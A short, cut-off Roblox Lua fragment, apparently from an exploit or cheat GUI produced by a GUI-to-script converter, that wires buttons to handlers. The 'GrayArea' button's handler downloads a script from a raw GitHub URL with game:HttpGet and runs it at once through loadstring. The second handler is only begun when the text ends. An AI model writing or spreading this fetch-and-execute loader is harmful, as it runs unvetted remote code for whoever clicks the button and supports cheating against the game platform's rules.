local function MMKLKVS_fake_script() -- GrayArea.GrayArea 
	local script = Instance.new('Script', GrayArea)

	script.Parent.MouseButton1Click:Connect(function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/bytemoo/Team/main/GrayArea"))()
	end)
end
coroutine.wrap(MMKLKVS_fake_script)()
local function BUNFUG_fake_script() -- TextButton.quitbutton 
	local script = Instance.new('Script', TextButton)

